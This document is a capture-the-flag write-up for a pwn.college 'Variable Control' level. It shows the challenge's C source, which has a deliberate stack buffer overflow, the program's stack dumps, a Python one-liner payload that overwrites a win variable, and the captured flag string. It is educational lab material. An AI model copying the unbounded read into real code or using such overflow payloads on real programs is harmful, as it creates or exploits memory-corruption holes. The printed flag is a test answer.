# Binary Exploitation

## Variable Control (easy)

### Solve :

**Flag:** `pwn.college{g58TMTorU3qbmbZMPZQMCUciCqz.QX3UzMzwSO5EzNzEzW}`

```
So far, your buffer overflows have simply set variables to non-zero values. Of course, memory errors often enable significantly more advanced controls over a program's state. In this challenge, you must overflow the buffer precisely to set a win condition variable to a specific value. Some things to keep in mind:

You will need to write binary data. This can't be printed on the keyboard; we recommend that you use something like Python to produce these bytes.
Keep endianness in mind!
Depending on how you generate the input data, you might accidentally terminate it with a newline! For example, bash's echo will newline-terminate by default (this behavior can be disabled using the -n flag). These newlines can cause problems --- if you are relying on precise control of program variables (which you are, in this module), an errant newline can unexpectedly corrupt program state and break your exploit. If you have doubts about whether your input has an errant newline, save it to a file and look at it using a hex dumper such as hd.
```

Opening the `.c` file for the challenge, i got
```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 1853; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[118];
        int win_variable;
        int lose_variable;
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 118);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is a \"win\" variable.\n");
    printf("By default, the value of this variable is zero.\n");
    printf("However, if you can set variable to 0x3699f0d0, the flag will be printed.\n");
    printf("You can change this variable by overflowing the input buffer, but keep endianness in mind!\n");
    printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.win_variable, ((unsigned long) &data.win_variable) - ((unsigned long) &data.input));

    puts(" But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you");
    puts("will not get the flag. Be careful not to overwrite this variable.\n");
    printf("The \"lose\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.lose_variable, ((unsigned long) &data.lose_variable) - ((unsigned long) &data.input));

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    FIND_CANARY(cp_, cv_, bp_);

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 118);

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the canary is stored at %p.\n", cp_);
    printf("- the canary value is now %p.\n", *(unsigned long*)(cp_));
    printf("- the address of the win variable is %p.\n", &data.win_variable);
    printf("- the value of the win variable is 0x%x.\n", data.win_variable);
    printf("- the address of the lose variable is %p.\n", &data.lose_variable);
    printf("- the value of the lose variable is 0x%x.\n", data.lose_variable);
    printf("\n");

    if (data.lose_variable)
    {
        puts("Lose variable is set! Quitting!");
        exit(1);
    }
    if (data.win_variable == 916058320)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```
Running the file reveals a stack frame
```
hacker@binary-exploitation~variable-control-easy:/challenge$ ./binary-exploitation-var-control-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd867ef200 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffd867ef208 (rsp+0x0008) | 08 04 7f 86 fd 7f 00 00 | 0x00007ffd867f0408 |
| 0x00007ffd867ef210 (rsp+0x0010) | f8 03 7f 86 fd 7f 00 00 | 0x00007ffd867f03f8 |
| 0x00007ffd867ef218 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007ffd867ef220 (rsp+0x0020) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffd867ef228 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef230 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef238 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef240 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef248 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef250 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef258 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef260 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef268 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef270 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef278 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef280 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef288 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef290 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef298 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef2a0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef2a8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd867ef2b0 (rsp+0x00b0) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffd867ef2b8 (rsp+0x00b8) | 00 12 f0 24 16 4e 3d be | 0xbe3d4e1624f01200 |
| 0x00007ffd867ef2c0 (rsp+0x00c0) | 00 03 7f 86 fd 7f 00 00 | 0x00007ffd867f0300 |
| 0x00007ffd867ef2c8 (rsp+0x00c8) | bc 22 40 00 00 00 00 00 | 0x00000000004022bc |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd867ef200, and our base pointer points to 0x7ffd867ef2c0.
This means that we have (decimal) 26 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 208 bytes.
The input buffer begins at 0x7ffd867ef230, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 118 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x3699f0d0, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7ffd867ef2a8, 120 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7ffd867ef2ac, 124 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffd867ef230 (the start of the input buffer)
right up to (but not including) 0x7ffd867f0230 (which is 3978 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
```
From this i find that, 
- win var is located 120 bytes after the start of the input buffer and lose var is 124 bytes, so the first 120 bytes can be padding and the next 4 will be the value in little endian. 
- to get the flag, the variable has to be set to `0x3699f0d0`, the flag will be printed

Now, 0x3699f0d0 in little endian is `0xd0 0xf0 0x99 0x36`

```python
import sys
sys.stdout.buffer.write(b'A'*120 + b'\xd0\xf0\x99\x36' + b'\x00'*4)
```

Running this payload `python3 -c "import sys; sys.stdout.buffer.write(b'A'*120 + b'\xd0\xf0\x99\x36' + b'\x00'*4)" | ./binary-exploitation-var-control-w` gave me the flag

```
hacker@binary-exploitation~variable-control-easy:/challenge$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*120 + b'\xd0\xf0\x99\x36' + b'\x00'*4)" | ./binary-exploitation-var-control-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe3a88f0a0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffe3a88f0a8 (rsp+0x0008) | a8 02 89 3a fe 7f 00 00 | 0x00007ffe3a8902a8 |
| 0x00007ffe3a88f0b0 (rsp+0x0010) | 98 02 89 3a fe 7f 00 00 | 0x00007ffe3a890298 |
| 0x00007ffe3a88f0b8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007ffe3a88f0c0 (rsp+0x0020) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffe3a88f0c8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f0d0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f0d8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f0e0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f0e8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f0f0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f0f8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f100 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f108 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f110 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f118 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f120 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f128 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f130 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f138 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f140 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f148 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3a88f150 (rsp+0x00b0) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffe3a88f158 (rsp+0x00b8) | 00 11 4c db f5 86 0d cd | 0xcd0d86f5db4c1100 |
| 0x00007ffe3a88f160 (rsp+0x00c0) | a0 01 89 3a fe 7f 00 00 | 0x00007ffe3a8901a0 |
| 0x00007ffe3a88f168 (rsp+0x00c8) | bc 22 40 00 00 00 00 00 | 0x00000000004022bc |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe3a88f0a0, and our base pointer points to 0x7ffe3a88f160.
This means that we have (decimal) 26 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 208 bytes.
The input buffer begins at 0x7ffe3a88f0d0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 118 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x3699f0d0, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7ffe3a88f148, 120 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7ffe3a88f14c, 124 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffe3a88f0d0 (the start of the input buffer)
right up to (but not including) 0x7ffe3a8900d0 (which is 3978 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
You sent 128 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe3a88f0a0 (rsp+0x0000) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffe3a88f0a8 (rsp+0x0008) | a8 02 89 3a fe 7f 00 00 | 0x00007ffe3a8902a8 |
| 0x00007ffe3a88f0b0 (rsp+0x0010) | 98 02 89 3a fe 7f 00 00 | 0x00007ffe3a890298 |
| 0x00007ffe3a88f0b8 (rsp+0x0018) | 1c 00 00 00 01 00 00 00 | 0x000000010000001c |
| 0x00007ffe3a88f0c0 (rsp+0x0020) | 1c 00 00 00 80 00 00 00 | 0x000000800000001c |
| 0x00007ffe3a88f0c8 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffe3a88f0d0 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f0d8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f0e0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f0e8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f0f0 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f0f8 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f100 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f108 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f110 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f118 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f120 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f128 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f130 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f138 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f140 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe3a88f148 (rsp+0x00a8) | d0 f0 99 36 00 00 00 00 | 0x000000003699f0d0 |
| 0x00007ffe3a88f150 (rsp+0x00b0) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffe3a88f158 (rsp+0x00b8) | 00 11 4c db f5 86 0d cd | 0xcd0d86f5db4c1100 |
| 0x00007ffe3a88f160 (rsp+0x00c0) | a0 01 89 3a fe 7f 00 00 | 0x00007ffe3a8901a0 |
| 0x00007ffe3a88f168 (rsp+0x00c8) | bc 22 40 00 00 00 00 00 | 0x00000000004022bc |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe3a88f0d0
- the saved frame pointer (of main) is at 0x7ffe3a88f160
- the saved return address (previously to main) is at 0x7ffe3a88f168
- the saved return address is now pointing to 0x4022bc.
- the canary is stored at 0x7ffe3a88f158.
- the canary value is now 0xcd0d86f5db4c1100.
- the address of the win variable is 0x7ffe3a88f148.
- the value of the win variable is 0x3699f0d0.
- the address of the lose variable is 0x7ffe3a88f14c.
- the value of the lose variable is 0x0.

You win! Here is your flag:
pwn.college{g58TMTorU3qbmbZMPZQMCUciCqz.QX3UzMzwSO5EzNzEzW}


Goodbye!
hacker@binary-exploitation~variable-control-easy:/challenge$
```
